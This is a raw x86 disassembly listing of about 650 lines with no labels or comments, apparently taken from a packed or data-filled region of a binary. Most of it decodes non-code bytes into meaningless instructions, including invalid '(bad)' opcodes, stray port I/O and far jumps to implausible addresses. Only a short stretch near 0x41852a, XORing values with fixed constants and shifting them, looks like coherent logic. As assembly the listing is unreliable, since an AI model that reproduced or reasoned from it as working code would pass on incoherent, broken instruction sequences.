  418196:	mov    dl,0x87
  418198:	add    edx,DWORD PTR [ebp-0x1d]
  41819b:	add    eax,0x18027c9a
  4181a0:	jle    0x41820c
  4181a2:	mov    ebx,0x8f571d9d
  4181a7:	push   esi
  4181a8:	imul   ecx,DWORD PTR [esi+ebx*1-0x184a2e55],0x8b5c8212
  4181b3:	das    
  4181b4:	stos   BYTE PTR es:[edi],al
  4181b5:	push   esi
  4181b6:	inc    edx
  4181b7:	and    bh,0x58
  4181ba:	mov    bl,dh
  4181bc:	leave  
  4181bd:	repz fist WORD PTR [ecx-0x1406502]
  4181c4:	or     ecx,ebx
  4181c6:	pusha  
  4181c7:	cmp    esi,DWORD PTR [eax+0x0]
  4181ca:	in     eax,dx
  4181cb:	mov    gs,WORD PTR [eax-0x6398e9f0]
  4181d1:	inc    ebx
  4181d2:	ret    
  4181d3:	jmp    0xc3a:0x50f0bd71
  4181da:	push   0x4a
  4181dc:	push   ss
  4181dd:	adc    BYTE PTR [eax-0x9],al
  4181e0:	mov    al,0x1
  4181e2:	sbb    dh,0xda
  4181e5:	push   ebx
  4181e6:	mov    al,0x9d
  4181e8:	jne    0x4181ef
  4181ea:	xlat   BYTE PTR ds:[ebx]
  4181eb:	adc    eax,0xbb2a4386
  4181f0:	ret    0xd4b8
  4181f3:	pop    eax
  4181f4:	(bad)  [ebx+0x11099b5]
  4181fa:	loopne 0x4181ee
  4181fc:	mov    dl,0x28
  4181fe:	and    DWORD PTR [eax+edx*4-0x6639475e],0xff3a66e2
  418209:	stos   DWORD PTR es:[edi],eax
  41820a:	pusha  
  41820b:	dec    esi
  41820c:	stos   BYTE PTR es:[edi],al
  41820d:	mov    ebx,0x29a860fe
  418212:	idiv   DWORD PTR [esi+0x69]
  418215:	sar    ebx,1
  418217:	jae    0x418222
  418219:	and    BYTE PTR ds:0x86f9a825,bh
  41821f:	pop    esi
  418220:	ror    cl,1
  418222:	sub    DWORD PTR [edi],edx
  418224:	ficomp DWORD PTR [ebx+edx*4-0x8]
  418228:	add    ch,dh
  41822a:	test   BYTE PTR [ecx],0xea
  41822d:	clc    
  41822e:	push   edi
  41822f:	loop   0x418294
  418231:	and    ebp,DWORD PTR [esp+eiz*2]
  418234:	sub    eax,DWORD PTR [edx]
  418236:	psraw  mm6,QWORD PTR [ebx+0x6e56a205]
  41823d:	xor    dh,ah
  41823f:	iret   
  418240:	jl     0x4182bb
  418242:	outs   dx,DWORD PTR ds:[esi]
  418243:	adc    BYTE PTR [ebx-0x70],dh
  418246:	fldln2 
  418248:	pop    ds
  418249:	push   ebp
  41824a:	inc    ebp
  41824b:	into   
  41824c:	(bad)  
  41824d:	fcmove st,st(0)
  41824f:	mov    eax,ds:0xc9e9a585
  418254:	mov    ebp,0x4803356f
  418259:	cli    
  41825a:	push   ds
  41825b:	repz fisubr WORD PTR [edi-0x4efa86b0]
  418262:	cdq    
  418263:	(bad)  
  418264:	in     eax,0x98
  418266:	call   0x1bec08a0
  41826b:	mov    eax,ds:0x97aa4adc
  418270:	or     al,0x3b
  418272:	sub    DWORD PTR [edx],edi
  418274:	enter  0x3c11,0xe5
  418278:	jmp    0x4182a8
  41827a:	leave  
  41827b:	rcr    BYTE PTR [ecx-0x31be5f0e],1
  418281:	retf   0x9665
  418284:	out    0x83,eax
  418286:	sub    eax,0x9c155733
  41828b:	cwde   
  41828c:	(bad)  
  41828e:	mov    bh,0x5c
  418290:	mov    es,WORD PTR ds:0x1f982dca
  418296:	hlt    
  418297:	scas   eax,DWORD PTR es:[edi]
  418298:	repnz lahf 
  41829a:	push   esi
  41829b:	cdq    
  41829c:	or     DWORD PTR [ebp+0x48e1da78],ebp
  4182a2:	jle    0x4182da
  4182a4:	xchg   esi,eax
  4182a5:	nop
  4182a6:	mov    cl,0x31
  4182a8:	je     0x4182ac
  4182aa:	or     al,0xa
  4182ac:	push   es
  4182ad:	shr    BYTE PTR [ecx-0x6160c2ff],1
  4182b3:	lods   al,BYTE PTR ds:[esi]
  4182b4:	lds    ebp,FWORD PTR [ecx+0x16]
  4182b7:	aam    0xd0
  4182b9:	xor    esp,DWORD PTR [ebp-0x78]
  4182bc:	dec    esi
  4182bd:	lods   eax,DWORD PTR ds:[esi]
  4182be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182bf:	scas   eax,DWORD PTR es:[edi]
  4182c0:	push   edx
  4182c1:	je     0xb92e622
  4182c7:	sbb    ah,BYTE PTR [eax-0x54]
  4182ca:	bound  esi,QWORD PTR [esi+0x33]
  4182cd:	sub    DWORD PTR [ecx-0x636df432],edx
  4182d3:	jo     0x418301
  4182d5:	test   DWORD PTR [ecx-0x535878e0],edx
  4182db:	(bad)  
  4182dd:	pop    eax
  4182de:	aaa    
  4182df:	pcmpgtd mm2,QWORD PTR [ebp-0x4ed36a95]
  4182e6:	dec    edx
  4182e7:	cmc    
  4182e8:	mov    bl,0xc1
  4182ea:	addr16 jl 0x4182c5
  4182ed:	rcl    DWORD PTR [ecx],0x9c
  4182f0:	xchg   ebx,eax
  4182f1:	sub    cl,ah
  4182f3:	pusha  
  4182f4:	add    eax,0x41099ca0
  4182f9:	(bad)  
  4182fa:	mul    DWORD PTR [edi-0x1ca8ddf8]
  418300:	mov    dl,0x17
  418302:	(bad)  
  418303:	pop    esi
  418304:	dec    ebx
  418305:	repz pop edi
  418307:	dec    eax
  418308:	cmp    ch,BYTE PTR [edx+0x17efd898]
  41830e:	pop    esi
  41830f:	xchg   ecx,eax
  418310:	adc    esp,edx
  418312:	stos   DWORD PTR es:[edi],eax
  418313:	stos   DWORD PTR es:[edi],eax
  418314:	jnp    0x41836a
  418316:	ret    0x6df2
  418319:	cdq    
  41831a:	xchg   ecx,eax
  41831b:	xchg   ebx,eax
  41831c:	test   BYTE PTR [esp+edx*1],bl
  41831f:	ss daa 
  418321:	or     al,dl
  418323:	je     0x41837e
  418325:	sub    ebp,DWORD PTR [esi-0xd]
  418328:	retf   0xde3c
  41832b:	out    dx,eax
  41832c:	pop    ds
  41832d:	jecxz  0x418330
  41832f:	cmp    BYTE PTR [edi-0x44],bh
  418332:	ss inc ebp
  418334:	adc    dl,BYTE PTR [edx+edi*1]
  418337:	out    dx,eax
  418338:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418339:	fs sub al,0xb9
  41833c:	(bad)  
  41833e:	jns    0x41830e
  418340:	pop    eax
  418341:	sbb    eax,0x7e7ef3b5
  418346:	dec    edx
  418347:	lock call 0x23dafa7d
  41834d:	lods   al,BYTE PTR ds:[esi]
  41834e:	and    al,0xc0
  418350:	pop    esp
  418351:	push   eax
  418352:	mov    BYTE PTR [ebp-0x1dce26e5],0x86
  418359:	loop   0x418326
  41835b:	lods   al,BYTE PTR ds:[esi]
  41835c:	inc    edx
  41835d:	call   FWORD PTR [esp+esi*1]
  418360:	ds push esp
  418362:	inc    esi
  418363:	add    ch,al
  418365:	mov    bh,bh
  418367:	aad    0xb9
  418369:	and    BYTE PTR [edi-0x40],dl
  41836c:	mov    WORD PTR [edx-0x34],fs
  41836f:	mov    DWORD PTR [ebx-0x17868956],edx
  418375:	xchg   ebp,eax
  418376:	or     esp,edi
  418378:	ds push esp
  41837a:	adc    eax,0xc468bd6
  41837f:	hlt    
  418380:	jmp    0x6dfc:0xf3cd3ea0
  418387:	outs   dx,DWORD PTR ds:[esi]
  418388:	fistp  QWORD PTR [ebx-0x23bd913a]
  41838e:	cmp    edx,esp
  418390:	enter  0x6fc5,0x32
  418394:	xchg   edx,eax
  418395:	sbb    ebx,esp
  418397:	xor    DWORD PTR [eax-0x341f83b0],edi
  41839d:	lods   eax,DWORD PTR ds:[esi]
  41839e:	mov    ebx,0xfa56b442
  4183a3:	inc    ebx
  4183a4:	pop    eax
  4183a5:	dec    ebp
  4183a6:	push   ebx
  4183a7:	call   FWORD PTR [esp+ebp*8-0x4b]
  4183ab:	sub    BYTE PTR [ebx-0x513630bc],ch
  4183b1:	lds    esp,FWORD PTR [ecx-0x2d]
  4183b4:	pop    edi
  4183b5:	je     0x4183bb
  4183b7:	adc    eax,0x6541a0a0
  4183bc:	inc    edi
  4183bd:	xor    ecx,DWORD PTR [eax+0x22]
  4183c0:	nop
  4183c1:	add    BYTE PTR [esi+edx*2+0x5d],ch
  4183c5:	adc    DWORD PTR [ebx+ebp*8],edi
  4183c8:	int3   
  4183c9:	pop    ecx
  4183ca:	daa    
  4183cb:	sbb    al,0xc1
  4183cd:	xor    DWORD PTR [ecx+0x55],esp
  4183d0:	dec    edx
  4183d1:	jg     0x41836d
  4183d3:	fbld   TBYTE PTR [ecx]
  4183d5:	cmp    bl,ah
  4183d7:	je     0x418413
  4183d9:	sub    bh,BYTE PTR [esp+edx*2+0x5b]
  4183dd:	repnz add DWORD PTR [esi+eiz*1+0xb29a01b],ecx
  4183e5:	mov    ebx,0xd23aa975
  4183ea:	push   esi
  4183eb:	jmp    0x20a7832a
  4183f0:	mov    bl,0x31
  4183f2:	mov    cl,BYTE PTR [esi]
  4183f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183f5:	loopne 0x418384
  4183f7:	adc    bh,BYTE PTR [edi+0x4b]
  4183fa:	jg     0x418461
  4183fc:	jecxz  0x418404
  4183fe:	add    DWORD PTR [esp+ebp*4],esi
  418401:	test   BYTE PTR [ecx+0x22],0x8c
  418405:	mov    bl,0x67
  418407:	push   esi
  418408:	adc    DWORD PTR [esp+edi*1],esi
  41840b:	add    eax,0x8050645a
  418410:	xchg   ebp,eax
  418411:	retf   0x9843
  418414:	retf   0xbb8
  418417:	imul   ecx,DWORD PTR [esi-0x1ddcbe07],0x78fcc530
  418421:	jmp    0x418428
  418423:	push   ebp
  418424:	sti    
  418425:	push   ds
  418426:	repnz pop es
  418428:	inc    DWORD PTR [esp+eax*4]
  41842b:	(bad)  
  41842d:	ret    0x7877
  418430:	push   ds
  418431:	xchg   ebx,eax
  418432:	xchg   ebp,eax
  418433:	call   0x6f76c59b
  418438:	mov    ds:0x697f03d0,al
  41843d:	xchg   esi,eax
  41843e:	loope  0x418423
  418440:	xlat   BYTE PTR ds:[ebx]
  418441:	call   0xfe34:0x8ce03572
  418448:	xor    DWORD PTR [eax-0x2ee6d65b],esi
  41844e:	and    DWORD PTR [edx+0x1ceb8883],ebx
  418454:	mul    DWORD PTR [ebp-0x63]
  418457:	sbb    esi,ebp
  418459:	jle    0x4183f8
  41845b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41845c:	fwait
  41845d:	xchg   esi,eax
  41845e:	adc    DWORD PTR [ebp-0x2c],ecx
  418461:	cmp    DWORD PTR [ebp+0x4a7750fe],ecx
  418467:	std    
  418468:	imul   DWORD PTR [esp+esi*4+0x7db30a88]
  41846f:	pop    edi
  418470:	jl     0x418492
  418472:	dec    edi
  418473:	lock mov edx,0x2865b209
  418479:	pop    ebx
  41847a:	in     eax,dx
  41847b:	(bad)  
  41847c:	(bad)  
  41847d:	adc    ch,BYTE PTR [ebp-0x52]
  418480:	ret    0x2bd0
  418483:	daa    
  418484:	lock dec ebx
  418486:	mov    dl,0xa2
  418488:	lock jbe 0x41840d
  41848b:	cmp    DWORD PTR [ebx-0x34280543],ebp
  418491:	leave  
  418492:	sbb    dh,BYTE PTR [esi-0x7d]
  418495:	push   esp
  418496:	pop    ebp
  418497:	js     0x41846c
  418499:	cmp    ch,bh
  41849b:	in     eax,0x93
  41849d:	jnp    0x4184cf
  41849f:	sbb    DWORD PTR [ebx+0x2ddbe803],edi
  4184a5:	(bad)  
  4184a6:	pop    esp
  4184a7:	sbb    al,0x64
  4184a9:	fmul   QWORD PTR [esi]
  4184ab:	ins    DWORD PTR es:[edi],dx
  4184ac:	add    BYTE PTR [esi*2+0x638024d2],ah
  4184b3:	enter  0xe7aa,0x68
  4184b7:	cmp    ebp,edx
  4184b9:	adc    eax,0x2aa64869
  4184be:	nop
  4184bf:	sub    DWORD PTR [ecx],edi
  4184c1:	out    dx,eax
  4184c2:	push   0x5d
  4184c4:	inc    edx
  4184c5:	(bad)  
  4184c6:	sub    BYTE PTR [eax+ebp*4],bh
  4184c9:	lds    eax,FWORD PTR [ecx+ebp*4]
  4184cc:	jl     0x4184de
  4184ce:	cs lds ebx,FWORD PTR cs:[ebx+0x5f]
  4184d3:	ret    0x7989
  4184d6:	add    DWORD PTR [ebx+0x7],esp
  4184d9:	loop   0x4184ff
  4184db:	sub    edx,DWORD PTR [eax]
  4184dd:	xor    BYTE PTR [ebx-0x46],0xe4
  4184e1:	mov    ds:0xa9d2ac3e,eax
  4184e6:	dec    eax
  4184e7:	or     BYTE PTR [eax+0x52ad5be6],bh
  4184ed:	(bad)  
  4184ef:	pop    ds
  4184f0:	xor    al,0xd3
  4184f2:	pop    bx
  4184f4:	add    eax,0x3b47290d
  4184f9:	mov    ds:0x840653f,al
  4184fe:	jns    0x4184fc
  418500:	pop    esp
  418501:	out    dx,al
  418502:	jne    0x41853d
  418504:	sub    eax,0xd2d722b2
  418509:	xlat   BYTE PTR ds:[ebx]
  41850a:	fisubr WORD PTR [esi+0x30]
  41850d:	int3   
  41850e:	sub    esi,DWORD PTR [esi+0x6f]
  418511:	push   es
  418512:	into   
  418513:	and    edx,DWORD PTR [edx+0x5608e73]
  418519:	cld    
  41851a:	pop    ecx
  41851b:	adc    ebp,DWORD PTR [edx]
  41851d:	pop    eax
  41851e:	jle    0x4184ea
  418520:	cmp    ebx,DWORD PTR [ebx]
  418522:	or     eax,0x18a95038
  418527:	mov    dh,0x37
  418529:	scas   al,BYTE PTR es:[edi]
  41852a:	mov    esp,0xf151c55e
  41852f:	mov    ecx,eax
  418531:	or     ecx,DWORD PTR [ebp+0x10]
  418534:	xor    eax,eax
  418536:	or     edx,eax
  418538:	xor    ecx,0xba699573
  41853e:	xor    edx,0x9c0a89d8
  418544:	mov    DWORD PTR [esi],ecx
  418546:	mov    DWORD PTR [esi+0x4],edx
  418549:	mov    eax,0xc0000000
  41854e:	mov    ecx,DWORD PTR [esi]
  418550:	mov    edx,DWORD PTR [esi+0x4]
  418553:	mov    edx,ecx
  418555:	shl    edx,0x1e
  418558:	xor    edx,eax
  41855a:	mov    DWORD PTR [ebp+0x14],edx
  41855d:	mov    edx,DWORD PTR [esi]
  41855f:	mov    edi,DWORD PTR [esi+0x4]
  418562:	xor    edi,0x9c0a89d8
  418568:	xor    edx,0xba699573
  41856e:	shrd   edx,edi,0x2
  418572:	shr    edi,0x2
  418575:	or     edi,DWORD PTR [ebp+0x14]
  418578:	xor    ecx,ecx
  41857a:	mov    DWORD PTR [ebp+0xc],edi
  41857d:	or     edx,ecx
  41857f:	mov    ecx,DWORD PTR [ebx]
  418581:	mov    edi,DWORD PTR [ebx+0x4]
  418584:	mov    edi,ecx
  418586:	shl    edi,0x1e
  418589:	xor    edi,eax
  41858b:	mov    eax,DWORD PTR [ebx]
  41858d:	mov    DWORD PTR [ebp+0x14],edi
  418590:	mov    edi,DWORD PTR [ebx+0x4]
  418593:	jmp    0x418b1d
  418598:	test   DWORD PTR [ebx+0x38127d46],0xa0bf58ac
  4185a2:	mov    edx,0xd4e217ae
  4185a7:	test   al,0x68
  4185a9:	outs   dx,DWORD PTR ds:[esi]
  4185aa:	or     al,0x16
  4185ac:	cmp    eax,0xd8161604
  4185b1:	mov    ?,edi
  4185b3:	adc    eax,0xfde2ea8c
  4185b8:	push   esp
  4185b9:	xor    DWORD PTR [ecx+0x380e8231],eax
  4185bf:	sbb    eax,0x66667115
  4185c4:	push   0x65ed3152
  4185c9:	addr16 sbb al,0x51
  4185cc:	jg     0x4185ba
  4185ce:	sub    eax,0xe2627e2d
  4185d3:	mov    BYTE PTR [edi+eiz*4-0x3e],dh
  4185d7:	into   
  4185d8:	(bad)  
  4185d9:	cli    
  4185da:	xor    BYTE PTR [edi-0x28cce16d],dl
  4185e0:	mov    ecx,0xaccae92
  4185e5:	cld    
  4185e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185e7:	add    dh,bl
  4185e9:	jae    0x418631
  4185eb:	clc    
  4185ec:	xchg   edi,eax
  4185ed:	jnp    0x4185b7
  4185ef:	inc    ebp
  4185f0:	imul   ebp,DWORD PTR [ecx-0x53db41e4],0x80e906d6
  4185fa:	sub    esp,DWORD PTR [eax]
  4185fc:	out    dx,eax
  4185fd:	dec    ebp
  4185fe:	or     ah,dh
  418600:	push   edi
  418601:	mov    ah,0xde
  418603:	pop    edi
  418604:	jmp    0x418603
  418606:	nop
  418607:	in     al,dx
  418608:	dec    edx
  418609:	add    ebx,esp
  41860b:	lock and edi,esp
  41860e:	daa    
  41860f:	mov    gs,WORD PTR [eax-0x37]
  418612:	cmp    esp,DWORD PTR [edx+0x7bf7dc35]
  418618:	aad    0x73
  41861a:	loop   0x41865f
  41861c:	out    0xc3,eax
  41861e:	jg     0x4185b2
  418620:	imul   esp,DWORD PTR [bx+di-0x677e],0x72317819
  418629:	push   edi
  41862a:	imul   esp,DWORD PTR [eax-0x6],0x16
  41862e:	sub    DWORD PTR [eax-0x6e],esp
  418631:	ins    BYTE PTR es:[edi],dx
  418632:	pop    es
  418633:	arpl   WORD PTR es:[eax+0x7aafebc8],bp
  41863a:	inc    esp
  41863b:	std    
  41863c:	and    eax,DWORD PTR [edx]
  41863e:	sbb    DWORD PTR [edi+0x1678b9dc],ecx
  418644:	cmp    DWORD PTR [ecx-0x396f4dab],ebp
  41864a:	(bad)  
  41864b:	shl    BYTE PTR [edi-0x42b5d41e],1
  418651:	data16 scas al,BYTE PTR es:[edi]
  418653:	mov    DWORD PTR [edi+0x79],edx
  418656:	jge    0x4186b6
  418658:	retf   0x40e5
  41865b:	pop    ecx
  41865c:	push   edx
  41865d:	mov    edi,0xaf013139
  418662:	loop   0x418671
  418664:	repnz mov ah,0x77
  418667:	fld    st(4)
  418669:	jge    0x41863c
  41866b:	outs   dx,BYTE PTR ds:[esi]
  41866c:	mov    ecx,DWORD PTR [edx+0x21]
  41866f:	jle    0x41863b
  418671:	or     BYTE PTR [ebp+ebp*8+0x4e],cl
  418675:	mov    edx,0xf52d8b03
  41867a:	test   BYTE PTR [ebx-0x685917bb],dh
  418680:	pusha  
  418681:	xor    BYTE PTR [edi-0x5e],al
  418684:	mov    edi,0xd30f4fb1
  418689:	dec    ecx
  41868a:	inc    eax
  41868b:	fdiv   st,st(3)
  41868d:	popa   
  41868e:	cmc    
  41868f:	clc    
  418690:	cld    
  418691:	push   0x6b
  418693:	dec    ebp
  418694:	pop    esp
  418695:	mov    eax,0x287b46f2
  41869a:	sub    eax,0x57e4b29a
  41869f:	outs   dx,BYTE PTR ds:[esi]
  4186a0:	(bad)  
  4186a1:	retf   0x7d67
  4186a4:	xor    eax,0x6a0929a
  4186a9:	mov    eax,ds:0x2ec077da
  4186ae:	jne    0x418727
  4186b0:	outs   dx,BYTE PTR ds:[esi]
  4186b1:	outs   dx,BYTE PTR ds:[esi]
  4186b2:	ds retf 
  4186b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186b5:	sbb    BYTE PTR [ecx],dh
  4186b7:	out    0x4e,al
  4186b9:	frstor [edi-0x40619598]
  4186bf:	popf   
  4186c0:	inc    ebp
  4186c1:	adc    eax,0xb8b14b18
  4186c6:	xor    dl,BYTE PTR [edx-0x13a70551]
  4186cc:	outs   dx,DWORD PTR ds:[esi]
  4186cd:	jl     0x41865d
  4186cf:	stos   BYTE PTR es:[edi],al
  4186d0:	mov    eax,ds:0xc90c43d2
  4186d5:	adc    eax,0x7675de80
  4186da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4186db:	(bad)  
  4186dc:	jp     0x41866b
  4186de:	add    al,0xa3
  4186e0:	sub    dh,BYTE PTR [ebx+edi*2-0x3f5dddfd]
  4186e7:	mov    ah,dh
  4186e9:	sub    al,0x9
  4186eb:	out    dx,eax
  4186ec:	xor    ah,BYTE PTR [eiz*2+0x4a94c42b]
  4186f3:	or     ebp,DWORD PTR [esi+0x1dea25ad]
  4186f9:	cmp    eax,0x64bc8799
  4186fe:	ss jno 0x41868e
  418701:	in     al,0x79
  418703:	mov    eax,esi
  418705:	adc    DWORD PTR [ebx+0x71adf4a1],esp
  41870b:	fcmove st,st(3)
  41870d:	pop    ebp
  41870e:	jp     0x418705
  418710:	or     al,BYTE PTR [edi]
  418712:	jne    0x418778
  418714:	xchg   BYTE PTR [ecx],dl
  418716:	inc    ebx
  418717:	cdq    
  418718:	jnp    0x41874d
  41871a:	test   ecx,0x76c3db8
  418720:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418721:	adc    ebx,ebp
  418723:	sbb    al,0xdc
  418725:	(bad)  
  418726:	in     eax,dx
  418727:	sahf   
  418728:	mov    bl,0xa1
  41872a:	in     al,dx
  41872b:	mov    ecx,0xcaeca8b1
  418730:	sub    eax,0xe2e12099
  418735:	inc    ebp
  418736:	jge    0x418778
  418738:	stc    
  418739:	mov    ch,0xc5
  41873b:	jle    0x4186d2
  41873d:	inc    ecx
  41873e:	push   eax
  41873f:	push   eax
  418740:	jg     0x418793
  418742:	sub    BYTE PTR [edi+0x2df22d93],dh
  418748:	push   ss
  418749:	ja     0x4187c0
  41874b:	and    ebp,DWORD PTR [eax+0x24df5c61]
  418751:	adc    BYTE PTR [ecx-0x3d5924fb],cl
  418757:	cli    
  418758:	cmp    bh,BYTE PTR [edx+eiz*8-0x57e3a8b4]
  41875f:	loope  0x4186fe
  418761:	sub    esp,DWORD PTR [ebp+0x527d1cd0]
  418767:	ds push es
  418769:	jns    0x4187c8
  41876b:	sbb    BYTE PTR [esp+ebx*2+0x246f13b3],0x26
  418773:	and    ebx,0x77c2b7f2
  418779:	or     BYTE PTR [edi-0x35],0x70
  41877d:	sti    
  41877e:	jae    0x4187eb
  418780:	js     0x418730
  418782:	adc    bl,BYTE PTR [esi]
  418784:	into   
  418785:	aas    
  418786:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418787:	push   ecx
  418788:	sub    eax,0x7d4125cf
  41878d:	icebp  
  41878e:	inc    eax
  41878f:	jmp    0x5d86:0xa276d753
  418796:	jp     0x4187c8
  418798:	inc    edx
  418799:	sbb    BYTE PTR [ebx+0x5a4d6693],cl
  41879f:	push   esi
  4187a0:	jno    0x4187df
  4187a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187a3:	adc    cl,BYTE PTR [ecx+ebp*4]
  4187a6:	sub    BYTE PTR [esi+0xb],0x6f
  4187aa:	aas    
  4187ab:	(bad)  
  4187ac:	fimul  DWORD PTR [eax]
  4187ae:	ins    DWORD PTR es:[edi],dx
  4187af:	add    DWORD PTR [eax],0xf
  4187b2:	pop    esp
  4187b3:	or     eax,0xe80ca8be
  4187b8:	es mov WORD PTR cs:0xc7fec096,ds
  4187c0:	inc    esi
  4187c1:	sbb    DWORD PTR [eax],0xac793ee3
  4187c7:	retf   0x31a9
  4187ca:	cmp    al,0x9e
  4187cc:	ret    0xea3c
  4187cf:	lds    ebx,FWORD PTR [ecx-0x988f1a5]
  4187d5:	cdq    
  4187d6:	ja     0x418824
  4187d8:	hlt    
  4187d9:	adc    al,al
  4187db:	mov    al,ds:0x9785a27e
  4187e0:	jmp    FWORD PTR [ebx-0x10]
  4187e3:	inc    ebp
  4187e4:	jbe    0x4187d1
  4187e6:	dec    ecx
  4187e7:	dec    esi
  4187e8:	xor    BYTE PTR [edi+esi*2],cl
  4187eb:	push   edi
  4187ec:	adc    al,0x5b
  4187ee:	inc    ebp
  4187ef:	loopne 0x4187fb
  4187f1:	mov    edi,0xc858a9fa
  4187f6:	sahf   
  4187f7:	mov    esi,ebp
  4187f9:	or     ecx,DWORD PTR [esi+0x58f3776a]
  4187ff:	inc    edx
  418800:	mov    ebx,0x7d109982
  418805:	cld    
  418806:	and    esi,DWORD PTR [edx+0x420dbd47]
  41880c:	sar    DWORD PTR [ebp-0x1b19966a],0xcb
  418813:	loopne 0x4187a4
  418815:	lds    esp,FWORD PTR [eax+ebx*2+0x60a72bba]
  41881c:	cmp    BYTE PTR [ebx],ch
  41881e:	adc    edi,DWORD PTR [edi+ebx*2-0x52]
  418822:	out    0x8c,al
  418824:	jmp    0x418825
  418826:	stos   DWORD PTR es:[edi],eax
  418827:	fs pop esi
  418829:	int3   
  41882a:	(bad)  
  41882b:	repnz test al,0x49
  41882e:	mov    ecx,0xd446eb21
  418833:	push   ebx
  418834:	sub    bl,BYTE PTR [edi-0x5e]
  418837:	div    DWORD PTR cs:[ecx]
  41883a:	(bad)  
  41883b:	sub    esi,DWORD PTR [esi+0x66]
  41883e:	push   eax
  41883f:	push   cs
  418840:	cmp    BYTE PTR [ebp+0x6bc9823a],al
  418846:	ds adc al,0xaa
  418849:	inc    esi
  41884a:	outs   dx,BYTE PTR ds:[esi]
  41884b:	out    0x7,al
  41884d:	xchg   DWORD PTR [esi-0x2d],ebx
  418850:	xchg   ebx,eax
  418851:	pop    edx
  418852:	adc    ch,bh
  418854:	into   
  418855:	add    edi,edx
  418857:	jmp    0x2019a2b0
  41885c:	pop    es
  41885d:	and    DWORD PTR [esp+eiz*2-0x605c1593],edx
  418864:	sbb    al,0x93
  418866:	pop    esi
  418867:	cld    
  418868:	jl     0xf03b7e59
  41886e:	pop    edi
  41886f:	js     0x418893
  418871:	pop    ebx
  418872:	iret   
  418873:	enter  0x5f1,0xad
  418877:	dec    ebx
  418878:	imul   edi,DWORD PTR [edi-0x4f],0x2735bd41
  41887f:	inc    ecx
  418880:	ret    
  418881:	fdiv   QWORD PTR [ebx+0x1f]
  418884:	push   ebx
  418885:	xchg   edi,eax
  418886:	push   ds
  418887:	mov    al,ds:0x5ac7d61d
  41888c:	xlat   BYTE PTR ds:[ebx]
  41888d:	jno    0x41888c
  41888f:	(bad)  
  418891:	bound  edi,QWORD PTR [ebx+0x53]
  418894:	jb     0x418894
  418896:	aad    0x2e
  418898:	rcl    BYTE PTR [esi+0x7038d097],0x77
  41889f:	aaa    
  4188a0:	jae    0x4188a5
  4188a2:	test   al,0x43
  4188a4:	jmp    0x41883c
  4188a6:	or     ch,bh
  4188a8:	fistp  DWORD PTR [esi-0x1f]
  4188ab:	iret   
  4188ac:	test   eax,0xcd29833a
  4188b1:	jmp    FWORD PTR [edx]
  4188b3:	adc    al,BYTE PTR [edi-0x35bf4050]
  4188b9:	xchg   DWORD PTR [ecx],ebp
  4188bb:	cmp    DWORD PTR [ebx-0x50],ecx
  4188be:	mov    ebp,0xae8e6b7c
  4188c3:	mov    ebx,0x97b6112f
  4188c8:	adc    DWORD PTR ds:0x53f75adc,ebp
  4188ce:	mov    ah,BYTE PTR [edx+0x65e16f9a]
  4188d4:	popa   
  4188d5:	dec    eax
  4188d6:	jecxz  0x418879
  4188d8:	mov    ds:0x75f04a3a,al
  4188dd:	and    BYTE PTR [edx],dh
  4188df:	inc    eax
  4188e0:	mov    esp,0xa1551be
  4188e5:	xor    al,0x24
  4188e7:	sub    al,0xe
  4188e9:	imul   edx,edi,0x85c9fbf6
  4188ef:	rol    DWORD PTR [ebx+0x532a25c6],1
  4188f5:	sti    
  4188f6:	fcomp  DWORD PTR [esi+0x2]
  4188f9:	in     eax,0x23
  4188fb:	mov    ebp,0xce02c8cb
  418900:	dec    esi
  418901:	mov    ebp,0x6390be6f
  418906:	sbb    DWORD PTR [edx+0x636e3f94],esp
  41890c:	shl    BYTE PTR [esi-0x42209b0b],0x53
  418913:	mov    ch,0xd9
  418915:	addr16 fsubr st,st(2)
  418918:	leave  
  418919:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41891a:	imul   esi,DWORD PTR [ecx],0xffffffe8
  41891d:	aaa    
  41891e:	mov    eax,0xb501a104
  418923:	in     al,dx
  418924:	push   eax
  418925:	pop    es
  418926:	dec    esp
  418927:	test   DWORD PTR [edi],esi
  418929:	cmp    dl,BYTE PTR [esi]
  41892b:	mov    ecx,0x4d067e45
  418930:	ret    
  418931:	mov    al,0xa1
  418933:	adc    eax,0x5a019f2
  418938:	xor    eax,0x35ede771
  41893d:	cmp    dh,dh
  41893f:	int3   
  418940:	arpl   ax,ax
  418942:	out    dx,eax
  418943:	fldenv [edx+0x33]
  418946:	push   ds
  418947:	sub    edi,DWORD PTR [ecx+ebx*8+0xe]
  41894b:	(bad)  
  41894c:	jmp    0x33ea:0x31673949
  418953:	dec    ebp
  418954:	(bad)  
  418955:	leave  
  418956:	retf   
  418957:	js     0x4188da
  418959:	mov    ebp,0xf672f6b6
  41895e:	mov    edx,DWORD PTR [edi+0x1a]
  418961:	sbb    dl,BYTE PTR [edi-0x53f9aa0]
  418967:	daa    
  418968:	mov    dl,0x2c
  41896a:	add    ebx,DWORD PTR [eax+0x26]
  41896d:	dec    esp
  41896e:	call   0xaa4c:0xbfc7b0ae
  418975:	xchg   ecx,eax
  418976:	add    ebp,DWORD PTR [edi+0x747e32bf]
  41897c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41897d:	jmp    0x33ca:0xb7cc842b
  418984:	inc    edx
  418985:	mov    ebp,0xaf7c8e32
  41898a:	out    0x0,al
  41898c:	cdq    
  41898d:	iret   
  41898e:	push   esi
  41898f:	jmp    0x4e0d:0x9180e7cb
  418996:	les    ebx,FWORD PTR [ecx+0x2982b901]
  41899c:	push   cs
  41899d:	je     0x41899a
  41899f:	outs   dx,DWORD PTR ds:[esi]
  4189a0:	jle    0x41898c
  4189a2:	dec    eax
  4189a3:	push   esp
  4189a4:	stos   DWORD PTR es:[edi],eax
  4189a5:	retf   0xf11e
  4189a8:	sub    eax,0xdda7e5b5
  4189ad:	push   0xffffff8b
  4189af:	add    DWORD PTR [ebp-0x6859524],edi
  4189b5:	jne    0x418982
